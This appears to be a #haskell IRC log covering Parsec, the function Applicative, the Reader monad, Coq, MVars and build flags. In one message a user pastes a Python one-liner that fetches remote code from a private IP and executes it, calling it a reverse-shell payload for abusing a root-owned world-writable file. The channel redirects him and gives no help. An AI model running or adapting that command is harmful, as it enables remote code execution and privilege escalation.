00:06:46 <opqdonut> quchen: https://en.wikipedia.org/wiki/Robert_Cecil_Martin sums it up pretty well. He was part of the agile manifesto, and he wrote some books
00:06:57 <dramforever> Robert Cecil Martin (colloquially known as Uncle Bob[2]) is [...] a co-author of the Agile Manifesto
00:07:17 <opqdonut> I don't know if he's actually _done_ anything though...
00:07:25 <opqdonut> and I haven't read any of his books
00:07:31 <dramforever> That's definitely not very 'programming language'-y
00:07:32 <opqdonut> but the couple of video talks I've seen have been ok
00:08:29 <quchen> I’ve seen the Wikipedia article, but writing the agile manifesto is hardly something that qualifies as related to programming languages
00:31:37 <biglama> hi guys, I'm trying to use Parsec and I would like to parse a list of strings separated by spaces
00:31:54 <biglama> I also want to check all the strings are there
00:32:11 <biglama> something like mapM (x -> string x >> spaces) ["coef1", "coef2"] 
00:33:29 <julienchurch> I have a quick question before I crash. How does something like `const <*> Just $ 1` type check?
00:34:56 <lynnard> biglama: not an expert on parsec but I assume something along the line of: some (string <* spaces) 
00:35:31 <Cale> :t const <*> Just
00:35:32 <lynnard> where string is the combinator you define for what a word is
00:35:34 <lambdabot> b -> b
00:36:17 <julienchurch> :t (<*>)
00:36:20 <lambdabot> Applicative f => f (a -> b) -> f a -> f b
00:36:36 <Cale> biglama: Does what you wrote not work?
00:37:06 <geekosaur> well, modulo missing \
00:37:11 <Cale> ah, yeah
00:37:17 <biglama> Cale: I have "Pattern syntax in expression context: x -> string x >> spaces".  Did you mean to enable TypeApplications?"
00:37:27 <Cale> Ah, yeah, you missed the \ for the lambda
00:38:00 <biglama> thanks ! sorry for the mistake
00:38:12 <Cale> julienchurch: Here, we're using f t = e -> t, so (<*>) :: (e -> a -> b) -> (e -> a) -> (e -> b)
00:38:23 <zipper> julienchurch: hmmm interesting
00:38:43 <biglama> lynnard: could you tell me how "some" works ? I'm havign trouble to find documentation on it
00:39:04 <lynnard> :i Alternative
00:39:12 <geekosaur> no :i in lambdabot
00:39:16 <Cale> julienchurch: and const :: u -> v -> u, so that becomes (e -> a -> e) -> (e -> a) -> (e -> e)
00:39:32 <lynnard> https://hackage.haskell.org/package/base-4.9.1.0/docs/Control-Applicative.html
00:39:49 <lynnard> biglama: checkout Alternative class
00:40:19 <julienchurch> Cale: reading what you wrote, one sec.
00:40:34 <biglama> lynnard: thanks. But there is no guarantee the keywords will be in order then ?
00:40:48 <biglama> in my example, I could have "coef2 coef1" instead of "coef1 coef2" ?
00:41:11 <lynnard> that's fine as long as what you give to 'some' as the argument parses these things out correctly
00:41:18 <akfp> I'm a bit lost wrt the `linear` package.  Can anyone show me how to create a vector of points, or a 3x3 matrix (for a affine 2d transform)?
00:42:45 <zipper> Cale but isn't the 1 applied to `Just` before being passed to const so const gets the `Just 1`
00:42:47 <zipper> *?
00:43:27 <biglama> lynnard: I'm having trouble figuring out how to keep the order. Would you mind giving me a concrete example ?
00:43:58 <biglama> btw, I've began a tutorial on parsec and I'm pleasantly surprised to see how easy it is to use (way easier than Boost's Spirit)
00:44:08 <zipper> (e -> a -> e) -> (e -> a) -> (e -> e) with const Just implies some sort of composition or the e being passed to both simultaneously
00:44:26 <zipper> Which is not the case because the $ means the 1 is applied to Just first
00:44:30 <zipper> Cale: ^
00:46:31 <lynnard> biglama: try  'some (some (noneOf " ") <* some space)' 
00:46:46 <zipper> Cale: I see how the f is (-> e) but past that I don't see much
00:46:47 <julienchurch> Maybe I'm misunderstanding something more fundamental. Are functions instances of Functor/Applicative?
00:46:55 <lynnard> again no expert - so someone who knows the syntax better could give a prettier version
00:46:57 <zipper> julienchurch: They are
00:48:07 <biglama> lynnard: ok, thanks
00:48:57 <zipper> julienchurch: In our case the f is (-> e) which is the `Just` which should be applied to the 1 to give us an a of type Maybe a
00:49:21 <zipper> but it seems const already at the same time took the e which is 1
00:49:28 <zipper> and will ignore the Just 1
00:52:12 <zipper> Oh wait I get it Cale in my head I was picturing const <*> (Just 1) while it really is of (const <*> Just) 1
00:55:47 <julienchurch> zipper: I was gonna say, ($) is lowest precedence.
00:56:18 <julienchurch> zipper: I think I'm getting how it type checks now, though. Still having a rough time visualizing it
00:56:39 <julienchurch> Does the head just get thrown away from the first function?
00:56:40 <zipper> julienchurch: Do you get what is going on? I can make the types align on paper. But I can't do a step by step evaluation on paper. :)
00:56:59 <zipper> julienchurch: What do you mean by the head?
00:58:30 <julienchurch> zipper: Like in this example:
00:58:38 <julienchurch> (\x -> (\y -> x + y)) <*> (\x -> 29) $ 1
00:59:13 <julienchurch> Wait, nevermind.
00:59:15 <quchen> (f <*> g) x = f x (g x), that’s it.
00:59:27 <zipper> julienchurch: Is this what you are calling the head ? `(\x -> (\y -> x + y)) <*> (\x -> 29)`
00:59:38 <zipper>  ((-> a) b -> a) <*> ((-> a) b) the Applicative f here is (-> a)
01:00:08 <zipper> the result of this `(\x -> 29)` gets thrown away
01:00:16 <zipper> idk if that's what you consider the head
01:01:03 <julienchurch> I meant the basically outer "x" of the first expression (in the first operand)
01:01:19 <julienchurch> Not sure if that's the right terminology
01:02:22 <zipper> julienchurch: Naaah that's not really what is happening. 1 is passed to both functions simultaneously as x 
01:03:04 <zipper> but the function `(\x -> 29)` ignores the 1 and just returns 29
01:03:37 <zipper> and then we have (\y -> 1 + y) being applied to the result of (\x -> 29) which is 29
01:03:41 <zipper> So we get 30
01:04:07 <zipper> What boggles my mind is how the 1 gets applied to both seemingly simulataneously
01:04:10 <zipper> :D
01:04:14 <julienchurch> zipper: Yeah, I just threw a constant in there to see what was going on with the second function. Your/quchen's explanations are helping me understand how it's happening
01:04:24 <julienchurch> I'm just not terribly sure why
01:04:38 <quchen> julienchurch: Use my definition to evaluate your expression by hand!
01:05:37 <zipper> quchen: I fail to see why <*> of functions f and g means apply the x to both at the same time
01:05:43 <zipper> but I can see it is happening
01:05:51 <zipper> based on (f <*> g) x = f x (g x)
01:06:02 <julienchurch> quchen: I did :] I guess the rule itself is what's getting me. Or maybe I'm tired enough that I don't see the logic
01:06:11 <julienchurch> I mean, what you wrote is clear to me
01:06:16 <zipper> julienchurch: Which rule?
01:09:07 <julienchurch> zipper: Gimme a minute, I'm about to try to explain myself :P
01:09:40 <julienchurch> gotta fire up ghci quick
01:10:09 <julienchurch> (because I'm not even sure what I'm talking about anymore)
01:10:16 <zipper> julienchurch: Ok take all the time you want
01:10:29 <zipper> It's 1209 hrs in my timezone
01:14:05 <julienchurch> It's 04:13 here now
01:14:11 <julienchurch> <- is a ding dong
01:15:48 <MarcelineVQ> :t is
01:15:50 <lambdabot> error:
01:15:50 <lambdabot>     • Variable not in scope: is
01:15:50 <lambdabot>     • Perhaps you meant one of these:
01:16:28 <dramforever> :t (<*>) @ (->) -- Please
01:16:31 <lambdabot> error: parse error on input ‘->’
01:16:41 <dramforever> :t (<*>) @(->) -- This?
01:16:43 <lambdabot> error: parse error on input ‘->’
01:16:44 <dramforever> Sorry...
01:16:47 <julienchurch> zipper: Ok, I think I'm starting to get it.
01:17:06 <MarcelineVQ> lambdabot doesn't TypeApplications
01:17:17 <roxxik> :t id @Int
01:17:19 <lambdabot> error:
01:17:20 <lambdabot>     Pattern syntax in expression context: id@Int
01:17:20 <lambdabot>     Did you mean to enable TypeApplications?
01:18:20 <dramforever> YES!
01:18:24 <dramforever> It doesn't help...
01:18:27 <MarcelineVQ> dramforever: if you wanted to apply that though it'd be :t (<*>) @ ((->)_)
01:18:47 <dramforever> MarcelineVQ: Hmm you're right
01:21:28 <zipper> wz1000: How does your IRC client connect from aws? A bnc?
01:22:16 <julienchurch> This is true, more or less: `[(\x -> x)] <*> [1] == [(\x -> x) 1]`. So it follows that `(\a -> (\b -> a + b) <*> (\x -> x) == ((\a -> (\b -> a + b)) (\x -> x)) == (\b -> (\x -> x) + b)`, right?
01:22:28 <julienchurch> Sorry for the lambdavomit.
01:23:37 <wz1000> zipper: I just leave weechat running in a tmux session
01:24:40 <julienchurch> zipper: ?
01:24:45 <zipper> wz1000: Making secOps and devOps people cringe must be your hobby :P
01:24:56 <zipper> julienchurch: Sorry I hadn't seen that let me look
01:25:13 <julienchurch> zipper: Of course!
01:26:30 <wz1000> zipper: Why? What's so terrible about this compared to stuff like IRCCloud
01:28:46 <julienchurch> zipper: I didn't try that out in GHCi, now I'm not so sure about it. Sorry. -_-
01:29:19 <merijn> zipper: Why would that make secops people cringe?
01:29:50 <zipper> julienchurch: Ok I read it over and over and it only works because + is commutative
01:30:04 <zipper> Because you keep switching the order of args to +
01:30:31 <zipper> but the first and the follows one are of different types
01:30:49 <zipper> in one we have a `[(a->b)]`
01:31:10 <zipper> in the second we have `(a -> b -> c)`
01:31:25 <zipper> wz1000: Sorry idk what IRCCloud is
01:32:35 <zipper> merijn: Well idk depends on the purpose of the server itself. It's not really an issue. I just would expect one to run a bouncer instead
01:32:45 <zipper> Which would have better UX
01:32:52 <zipper> but that is offtopic
01:33:13 <wz1000> zipper: https://www.irccloud.com/
01:33:29 <AndChat8064> the reader monad seems really useless
01:33:41 <zipper> Basically a web UI for IRC?
01:33:46 <merijn> zipper: tbh, I doubt a bouncer is more secure than just a VPS running tmux
01:33:56 <peteretep> I am using IRC Cloud and I like it
01:33:59 <cocreature> AndChat8064: it saves you from having to pass around the same argument to a lot of functions
01:34:01 <peteretep> I used to run irssi on a shell account
01:34:02 <merijn> AndChat8064: Why's that?
01:34:11 <dramforever> AndChat8064: Depending on what you expect out of it
01:34:11 <peteretep> But like the switch from mutt to gmail
01:34:12 <AndChat8064> hmm
01:34:16 <peteretep> Life got easier when I used irccloud
01:34:19 <dramforever> ReaderT is much more useful actually
01:34:38 <zipper> A lot of stuff we do in haskell seems useless "AndChat8064 | the reader monad seems really useless" 
01:34:39 <dramforever> well, sorry I meant I use ReaderT more often
01:34:48 <zipper> It's all about focusing on correctness
01:34:56 <zipper> and ease of almost proving it
01:34:58 <zipper> I think
01:35:02 <peteretep> A lot of stuff seems useless, but read about it, and one day you'll have a problem and be like "I know what solves that!!!!"
01:35:05 <AndChat8064> it is described as allowing you to read from an environment
01:35:05 <AndChat8064> or something
01:35:05 <AndChat8064> but why not explicitly pass
01:35:11 <peteretep> Like applicative :'D
01:35:17 <zipper> merijn: but weechat is in the tmux session
01:35:23 <AndChat8064> the entire env as a record object
01:35:28 <merijn> AndChat8064: Well, it's nice if you use the reader applicative, for example
01:35:36 <zipper> AndChat8064: You might want type safety
01:35:43 <cocreature> AndChat8064: if you have a single expression it doesn’t buy you anything. the power of Reader comes when you have a lot of expressions that all need to access the same environment
01:35:49 <merijn> AndChat8064: Imagine I have three functions, foo, bar, and baz that all want the same input
01:35:50 <dramforever> AndChat8064: because passing it around is tedious
01:35:50 <cocreature> at that point passing it manually becomes tedious
01:35:58 <MarcelineVQ> :X
01:36:03 <zipper> AndChat8064: You want the typechecker to prove that you are passing stuff correctly
01:36:09 <dramforever> AndChat8064: 'the entire env as a record object'
01:36:16 <dramforever> ^ What do you mean by this?
01:36:22 <zipper> merijn: Ah composability :)
01:36:40 <merijn> AndChat8064: Now I can have quux which needs the results of foo, bar, and baz, and do "quux <$> foo <*> bar <*> baz"  and have a single function that takes the input and passes it on to all the subfunctions without me needing to write the boilerplate
01:36:48 <AndChat8064> the env is a collection of values, no?
01:36:51 <AndChat8064> the record object also is
01:36:56 <dramforever> No it's just one value
01:37:01 <dramforever> The env *can* be a record
01:37:04 <AndChat8064> ok fine
01:37:07 <dramforever> They focus on different things
01:37:10 <AndChat8064> maybe one day ill understand
01:37:17 <dramforever> And *that's* why you ask before you answer
01:37:39 <AndChat8064> .
01:38:18 <dramforever> AndChat8064: What about this: If you want you pass this env thingy around normally
01:38:20 <zipper> AndChat8064: Have faith that you'll need it someday. It's what I do when learning CT lol
01:39:10 <dramforever> Reader just kinda avoids the noise of the env, *while* keeping it done pretty explicitly
01:39:17 <dramforever> that was compared to, say, global variables
01:40:20 <dramforever> I suppose you misunderstood what the enviroment is :) Those things are not really related, like, 'I think a car is useless, why don't you just drink water from a bottle?'-type not really related
01:40:40 <merijn> zipper: Wasting your time ;)
01:41:16 <merijn> zipper: Ok, not entirely, but my recommendation is that if the end goal is "become better at haskell" CT should be at the bottom of your list :)
01:41:23 <cocreature> learning CT is fun but it’s not all that helpful when you’re programming haskell
01:41:42 <lpaste> bwe revised “Conduit  readCSVFile”: “Conduit  readCSVFile” at http://lpaste.net/9045721241620578304
01:41:56 <merijn> zipper: Not to say that you shouldn't learn CT (I keep trying), but do it because you think it's fun or interesting, not for Haskell. I can recommend you far more useful things to learn to become better at haskell :p
01:42:09 <zipper> merijn: tbh CT has helped me understand how functions are Functors
01:42:29 <merijn> Including, but not limited too: Algebra, type theory, formal methods
01:42:46 <zipper> merijn: Algebra is a huge topic
01:42:57 <merijn> Incidentally, the books for the those topics are also a factor 100 more accessible than CT ;)
01:43:02 <zipper> maybe type theory I have not heard of formal methods
01:43:07 <merijn> zipper: Sure, I'm not saying you should learn all of it ;)
01:43:29 <merijn> zipper: formal methods in the sense of proving code correct
01:43:58 <zipper> merijn: Oh I've heard about coq on podcasts, that's as far as I know about proving correctness.
01:44:29 <merijn> zipper: For type theory the de facto standard book is "Types and Programming Languages" which is book written for undergrad/grad students and starts from untyped lambda calculus and builds up to way more than you need to implement standard haskell
01:44:58 <zipper> merijn: And I can use this to improve my haskell?
01:44:59 <bwe> In which way do you recommend me to transform the list type of [["56.56145325"],["99.42876163"], ...] into [56.56145325, 99.42876163] step-by-step? Changing the code in the do block of the readCSV.hs file and sending off `:r` in the ghci does not turn out to be wise.
01:45:02 <zipper> Will def read it
01:45:05 <merijn> It covers the type system, proofs of correctness of the type system and actual implementations of the type checkers (in ocaml, but if you know haskell it should be easy enough to read)
01:45:07 <zipper> or look at it
01:45:53 <cocreature> bwe: "map (read . head)" would be one option.
01:45:57 <bwe> In particular, I do not know how to get the type of `v`. If I knew, I could work on that.
01:46:05 <merijn> zipper: As for formal proofs using Coq, there is "Software Foundations" an excellent (free!) book (with exercises), that covers proving programs correct, starting from simple pure functions up to imperative languages
01:46:41 <merijn> zipper: Type theory helps a bit, in terms of understanding haskell better, but mostly interesting if you like programming languages and if you have vague aspirations to write your own (which I would also recommend)
01:47:13 <merijn> zipper: SF is probably more directly applicable as it teaches you how you would, for example, prove that your Monad instances follows the Monad laws :)
01:47:16 <merijn> @where tapl
01:47:16 <lambdabot> http://www.cis.upenn.edu/~bcpierce/tapl/
01:47:18 <merijn> @where sf
01:47:18 <lambdabot> "Software Foundations" by Pierce,Casinghino,Greenberg,Sjöberg,Yorgey in 2011-06 at <http://www.cis.upenn.edu/~bcpierce/sf/> about "the mathematical theory of programming and programming languages",
01:47:18 <lambdabot> "It develops basic concepts of functional programming, logic, operational semantics, lambda-calculus, and static type systems, using the Coq proof assistant."
01:47:29 <lpaste> bwe revised “Conduit  readCSVFile”: “Conduit  readCSVFile” at http://lpaste.net/9045721241620578304
01:47:48 <zipper> merijn: https://www.cis.upenn.edu/~bcpierce/sf/current/index.html
01:47:51 <zipper> ?
01:47:53 <bwe> cocreature: As I do not know the type of `v`, how do I know which head to use?
01:47:59 <merijn> zipper: Yeah, that one
01:48:07 <reactormonk> I've currently got code like (flip fmap) code transform because I prefer to read things from top down, instead of having to read from bottom to top - is there a nicer way?
01:48:27 <merijn> zipper: It's actually a giant literate Coq file that you can load inside your editor to interactively step through the examples and work out the exercises
01:48:35 <dramforever> reactormonk: Yes, put the long stuffs into a 'where' clause
01:48:47 <merijn> zipper: You can use ProofGeneral (emacs) or Coquille (vim) for a nice Coq IDE for that
01:49:11 <cocreature> bwe: you know the type of v! you have even explicitely stated that it’s "Vector (Row ByteString)" in your code
01:49:32 <zipper> merijn: I have never written coq and I am not in a hurry to because I don't see high chances of me applying it in a workplace
01:49:52 <zipper> merijn: Like programming time matters greatly at a startup
01:49:52 <reactormonk> How do I set env variables with stack --docker ghci?
01:49:54 <merijn> But like I said, I would also encourage anyone interested in learning type theory and implementing your own language/compiler, but then, I'm biased :p
01:50:08 <zipper> merijn: Do you work in research/
01:50:08 <dramforever> bwe: It's a 'Vector (Row ByteString)' right?
01:50:12 <dramforever> Do you understand?
01:50:15 <zipper> *?
01:50:16 <merijn> zipper: The book teaches Coq and how to prove things simultaneously, so no need to learn Coq first :)
01:50:22 <zipper> merijn: For sure
01:50:34 <merijn> zipper: Yes, but (unfortunately) not remotely related to programming languages and proofs :p
01:50:36 <bwe> dramforever: Yep.
01:50:50 <cocreature> zipper: well if you have enough time to learn category theory, it might be worth spending that time on something more useful :)
01:51:12 <zipper> cocreature: Burn!
01:51:32 <zipper> merijn: SF teaches Coq?
01:51:48 <dramforever> bwe: http://hackage.haskell.org/package/csv-conduit-0.6.7/docs/Data-CSV-Conduit-Types.html bottom
01:51:52 <dramforever> A Row is just a list of fields
01:51:54 <merijn> zipper: Yeah, a bit, anyway, Coq itself is huge :)
01:52:00 <dramforever> So you use the Prelude one
01:52:05 <zipper> merijn: I'm sold on it
01:52:19 <cocreature> zipper: don’t get me wrong. I now a fair amount of CT but I learned it because I find it interesting not because I expect to help me significantly in writing Haskell
01:52:25 <cocreature> s/now/know/
01:52:30 <merijn> zipper: Not so much a burn, but it's true, if you're worried about learning stuff you can apply than SF is definitely closer than CT, imo
01:52:45 <shayan_> what’s coq? and also what is that Software Foundations? roadmap to learning FRP? 
01:53:04 <lpaste> bwe revised “Conduit  readCSVFile”: “Conduit  readCSVFile” at http://lpaste.net/9045721241620578304
01:53:21 <zipper> merijn: I will at least give it a look
01:53:40 <merijn> Like I said, even earlier, I don't wanna discourage people from learning Category Theory, but somehow this common misconception that Haskell is based on CT and that CT helps your Haskell has crept into the world and it's just not true, so I'm just trying to avoid people investing weeks or months into learning something that doesn't help their goals :)
01:54:12 <merijn> shayan_: Coq is a dependently typed programming language used for computer aided mathematical proofs. Software Foundations is a book on how to do correctness proofs for programs using Coq
01:54:24 <dramforever> bwe: No no no the map works on the Vector so you need Vector.map but Prelude.head
01:54:34 <dramforever> a Vector... is *not* a list
01:54:41 <python123> hi, Im new to python. I have a scenario from a pentest whereby i have a file with 777 permission that is owned by root and has the group of root. I want to therefore abuse this poor configuration and execute a python reverset tcp payload to my machine. The command i want to execute is python -c "import urllib2; r = urllib2.urlopen('http://192.168.254.10:8080/'); exec(r.read());" This works from the 
01:54:47 <python123> command line without any problem i just need to work out how to call it.
01:55:00 <lyxia> python123: go to #python
01:55:12 <ph88> hey guys, i have here a part of a profiling output https://paste.fedoraproject.org/536717/14854244/raw/ how can i debug why some function gets called over 2 million times ?
01:55:23 <dramforever> *and* that's not how you define 'c'. That doesn't do IO, so you don't bind it, so you should just let c = Prelude.map whatever
01:55:36 <lpaste> bwe revised “Conduit  readCSVFile”: “Conduit  readCSVFile” at http://lpaste.net/9045721241620578304
01:55:45 <reactormonk> This code is using ClassyPrelude, so putStrLn wants a Text instead of String, as produced by show - how should I handle this?
01:55:48 <shayan_> merijn: it seems that coq is research-heavy? i mean, how applicable is this for application purposes on the web? just out of curiosity 
01:56:22 <cocreature> shayan_: you are not going to use coq directly but coq teaches you a certain mindset that can be helpful when reasoning about your code
01:56:33 <merijn> shayan_: I would say Coq isn't really a general purposes language. I mean it is, but almost no one uses it for that
01:56:34 <dramforever> bwe: and the 'c' thing? you are doing it I suppose?
01:56:44 <zipper> merijn: I'd say writing more code and tests helps in writing code but it's also good to go back to the book so that you're not repeating the very same old mistakes. I just need to write more in my case.
01:56:57 <merijn> shayan_: Usually would people do is write a program that's proven correct and then "extract" haskell/ocaml code from the proof
01:57:15 <zipper> merijn: So I write e.g a haskell program and then I go write it in Coq to prove it?
01:57:28 <zipper> cocreature: Oh I see
01:57:29 <shayan_> quite interesting
01:57:37 <merijn> zipper: You could, Coq also has extraction tools to generate code from proofs
01:58:12 <cocreature> you have to keep in mind that formally verifying code is a _lot_ of work
01:58:12 <merijn> zipper: Additionally, learning how to do the proofs makes it easier to do things in your head like looking at your code and going "oh, this is obviously correct"
01:58:15 <zipper> this generated code needs to be legible and maintainable.
01:58:25 <zipper> Although maybe just extensible
01:58:29 <zipper> Since it's correct
01:58:36 <dramforever> but how?
01:58:49 <zipper> dramforever: What?
01:58:52 <dramforever> do you need to prove the extended code correct?
01:58:55 <merijn> zipper: And there's some research that suggests that thinking about how to make your code formally verifiable helps avoid errors/bugs
01:58:55 <zipper> merijn: I see
01:59:17 <zipper> merijn: Yes thinking about types helps me understand what I'm doing a lot.
01:59:42 <zipper> dramforever: I assume you have to prove the extended code correct or make it maintainable.
01:59:53 <merijn> shayan_: I probably wouldn't use Coq if I was some social startup Web2.0 thing. THis is really more for things like "I wanna proof that the optimisations in my compiler never introduce bugs, so I can use them for the code running on my space shuttle" type things ;)
02:00:18 <roxxik> wasn't there just yesterday someone saying that formal verification won't show any bugs, but making your code verifiable will
02:00:25 <shayan_> merijn: makes sense :) nice to know about this though
02:00:36 <zipper> merijn: LOL whyyyy? "social startup Web2.0 thing" I probably shouldn't even be looking at haskell.
02:00:37 <merijn> shayan_: Which, incidentally, is something that is actually being done with Coq. CompCert is a formally verified C compiler and they are now working on "proven correct" optimisations
02:00:43 <zipper> Gotta write railzzzzz
02:00:44 <merijn> roxxik: Yes, me ;)
02:00:50 <cocreature> even the formal verification people are too lazy to verify that their formal verification tools are correct
02:01:18 <merijn> cocreature: CompCert guys are working on formally verifying x86, because their masochists
02:01:18 <shayan_> zipper: wrong.
02:01:31 <zipper> shayan_: Where am I wrong?
02:01:43 <shayan_> zipper: writing rails over haskell
02:02:01 <dramforever> zipper: Perhaps you should just extend the Coq code and do the generation again?
02:02:22 <merijn> shayan_: A lot of critical systems developers (so, like, planes) currently have to use clang/gcc with -O0 because both of those compilers introduce so many bugs during optimisation. So having a compiler with safe optimisations is really valuable :)
02:02:25 <cocreature> merijn: the coq/isabelle crowd is pretty good at actually caring about this. but there is a lot of modelchecking stuff (possibly based on SMT) and pretty much none of this is verified. I say this as someone doing research in that area myself :)
02:02:25 <zipper> dramforever: How about just write coq and forget about everything else
02:02:43 <ByteEater> Hello, all you nice people! Does anybody know the reason why Haskell (at least GHC) keeps an MVar taken (rendering it useless) when the thread that took it terminates? (Or should I ask this type of questions on #haskell-beginners?) Thanks in advance.
02:03:30 <cocreature> ByteEater: if you want it to be automatically released when the thread dies, you need to use something like "withMVar"
02:03:33 <zipper> shayan_: :)
02:03:37 <merijn> ByteEater: Because that's how they are designed? :p
02:03:46 <dramforever> 'taken' = empty = block if somebody else takes
02:03:49 <shayan_> merijn: i definitely see this very useful 
02:03:56 <merijn> ByteEater: Think of MVar's as "channels of size 1", not "mutable variable"
02:04:46 <ByteEater> @merijn, obviously :-) but is there any good rationale, like a footgun lurking if designed otherwise, or a prohibitive implementation cost?
02:04:46 <lambdabot> Unknown command, try @list
02:04:53 <ByteEater> merijn, obviously :-) but is there any good rationale, like a footgun lurking if designed otherwise, or a prohibitive implementation cost?
02:05:39 <dramforever> but you have withMVar right...?
02:05:54 <zipper> :t withMVar
02:05:56 <lambdabot> error: Variable not in scope: withMVar
02:06:07 <dramforever> :t Control.Concurrent.withMVar
02:06:08 <lambdabot> GHC.MVar.MVar a -> (a -> IO b) -> IO b
02:06:14 <merijn> ByteEater: Because that way you get thread-safety for free, they work as both a lock and mutable storage. But people are right, you can use withMVar if that's what you need and/or IORef
02:06:43 <cocreature> ByteEater: I think the reason why we don’t have some magic thread finalizers is that you can write your own using "bracket" or the underlying functions. or in most cases you can just use "withMVar"
02:06:46 <merijn> ByteEater: So they work like that, because there's already other things that don't work like that, so whether MVar is the right choice depends on what you're doing :)
02:06:53 <dramforever> Hmm, I wouldn't quite expect a MVar to suddenly unblock if somebody else dies, right?
02:07:16 <dramforever> I mean, what do I take out of it?
02:07:30 <ByteEater> right, I know about withMVar, I was just curious what the reasoning was when it was designed this way
02:07:36 <dramforever> An exception perhaps? How about async: http://hackage.haskell.org/package/async
02:07:41 <ByteEater> merjin, makes sense, thanks :-)
02:08:02 <ByteEater> s/merjin/merijn
02:09:41 <merijn> ByteEater: It's very common to, for example use MVar as, indeed, a size 1 channel and they're used to, for example, implement Chan too. So if I take something out, I don't necessarily want it put back when I kill the thread, because then using them as channels or to implement channels becomes impossible
02:16:40 <dramforever> ByteEater: how about this: A MVar *isn't* taken by a thread, it's just empty or filled
02:17:39 <dramforever> specifically it's actually possible to create an empty MVar
02:18:55 <dramforever> I can create one in thread A, take it from thread B, fill the MVar in thread C and it all makes sense
02:19:08 <dramforever> Sorry gotta go, can't answer anything :(
02:20:02 <bwe> dramforever: I want a function that spits out a list of floats. Currently, I have that main block of which I don't know how to get the list out of the Vector that is `c`. It's less about the solution itself, more about changing the current situation enabling me to do the very next step.
02:20:29 <ByteEater> indeed, for the record: thx, dramforever
02:23:50 <lpaste> athan pasted “Cabal compile error” at http://lpaste.net/351660
02:24:05 <athan> What would be your course of action for dissecting this issue? ^
02:25:17 <cocreature> athan: remove dist and hope that it disappears on a rebuild ;)
02:25:38 <athan> ): that build took a day on this rpi
02:25:46 <athan> phooey, alright
02:26:20 <cocreature> I thought GHC can crosscompile? that should allow you to avoid the terrible built times on a RPI
02:26:25 <merijn> athan: Welcome to my life ;)
02:26:33 <merijn> Except it's not on RPi :p
02:26:49 <athan> cocreature: I don't think so, I would need to build to the llvm backend, then somehow cross-compile with llvm iirc
02:26:54 <athan> which Id on't know how :x
02:27:09 <athan> merijn: :P what do you use?
02:28:20 <merijn> athan: 32 core Intel machines with shit loads of RAM, but it still takes all day to run my stuff :p
02:28:32 <athan> O_O
02:28:44 <athan> ...a metric shit load? :v
02:29:04 <cocreature> I get annoyed if I need to wait 5 minutes to get my results
02:29:56 <merijn> cocreature: I'm running, let's see 159 x 5 x 20 x 4 experiments, so it takes me like 3-4 days for all of them to finish >.>
02:30:33 <cocreature> merijn: do you at least have the ability to do some sort of test of your code on a smaller scale before you start the experiments?
02:31:34 <merijn> cocreature: Yeah, I test my implementation is correct with single runs, but it's pretty battle-tested now, I just need a full set of runtimes
02:36:09 <cocreature> merijn: formal verification benchmarks are easy. you run it once on your local machine and record the times. they are useless anyway since there are no standard benchmarks so there is nothing to compare it to. at best you can benchmark against the old version of your tool but really nobody cares about the times as long as they seem somewhat reasonable
02:37:28 <merijn> My actual runtimes aren't even that bad, like couple of seconds usually with some outliers
02:37:41 <ph88> is -O0 the default ?
02:37:48 <merijn> I just have too many :p
02:37:53 <cocreature> ah that sounds a lot better than 3-4 days :)
02:37:59 <cocreature> ph88: afaik O1 is the default
02:38:05 <ph88> oh oh
02:38:06 <merijn> -O0 is default I think
02:38:15 <merijn> If you use cabal it uses whatever is in your cabal config
02:38:26 <merijn> cocreature: Yes, but large number times couple of seconds == 3-4 days :p
02:38:28 <ph88> don't think it's in my cabal config
02:38:44 <cocreature> merijn: yeah but for testing you can at least only run a few of those
02:38:50 <merijn> cocreature: yeah
02:39:04 <cocreature> ph88: so cabal defaults to 1 according to the docs
02:39:07 <cocreature> not sure what GHC defaults to
02:39:19 <cocreature> https://cabal.readthedocs.io/en/latest/nix-local-build.html?highlight=optimization#cfg-field-optimization
02:39:21 <merijn> Newer cabal's do, old cabal used -O0
02:39:32 <ph88> https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/flags.html#optimisation-levels
02:39:46 <ph88> i use stack
02:40:02 <cocreature> stack probably ignores your cabal.config
02:40:17 <cocreature> just pass the optimization level explicitely if you care about it :)
02:40:27 <ph88> i use this command:  stack build --ghc-options '-rtsopts -fprof-auto -fprof-auto-calls -fprof-cafs' --executable-profiling
02:40:36 <ph88> ok
02:40:51 <ggVGc> I'm so glad we have stck
02:40:53 <ggVGc> stack*
02:40:57 <ph88> hurray for stack !
02:44:49 <EvilMachine> What’s the purpose of stack? The website lists only generic things.
02:47:00 <EvilMachine> (And when did “CLI” become “REPL”? The latter seems to be a word used by WhatWGdiots who don’t know what a CLI is.)
02:48:04 <merijn> EvilMachine: REPL is Lisp terminology, so it's been around since, say, the 60s?
02:49:02 <EvilMachine> Ah, OK. So it’s the "inner-platform effect" word for CLI. Like “browser” or “editor” is the IPE word for “operating system”. XD
02:53:27 <ph88> does someone want to spend some time to help me find a loop in my code? i have debug output but i don't know how to interpret it
02:59:57 <pycer> is haskell a general puropse language?
03:00:36 <opqdonut> yes
03:00:45 <pycer> i mean, suppose i wanna build a stock screener in python. it's got all the cool libraries and stuff like that. can it be done in Haskell?
03:01:19 <pycer> i am looking for a challenge. and no i am no better in python than i was in qbasic in school
03:01:49 <pycer> @where lyah
03:01:49 <lambdabot> http://www.learnyouahaskell.com/
03:03:06 <pycer> can i learn enough haskell in 3 months to write a stock screener?
03:05:23 <Geekingfrog> What's your background, and how much time can you put in these 3 months ?
03:10:37 <zipper> pycer What is a stock screener?
03:10:40 <pycer> Geekingfrog: my background: got into computer when i was 14. on and off pseudo-learning with python, c, ruby.
03:11:08 <zipper> pycer: So no FP before?
03:11:21 <zipper> pycer: Do you write your code with a lot of objects and such?
03:11:22 <pycer> zipper: those ticker symbols and their prices. like in yahoo finance :D
03:13:22 <ph88> pycer, 3 months is not enough
03:13:30 <pycer> zipper: no fp. i actually dont write with a lot of objects and such. what i have written is a twitter bot
03:14:24 <roxxik> 3 months and a quite some help could get you there.... i'm not sure if you'll grasp the code afterwards....
03:14:49 <pycer> zipper: so turns out i have this debilitating disease that was making me all fatigued and anxious. now im on medication and feeling enthusiastic. i want into programming again :)
03:15:25 <ph88> go for it
03:17:49 <pycer> hey thank you guys. im a lazy bum. but now that ive announced my goal for the next 3 months, i feel sort of a pressure and obligation as a result of the ensuing intellectual pressure to learn it well enough in that timeframe. and ofcourse post in here :D
03:19:50 <Geekingfrog> Don't give up if you can't reach this goal in three months though. It's a quite ambitious one.
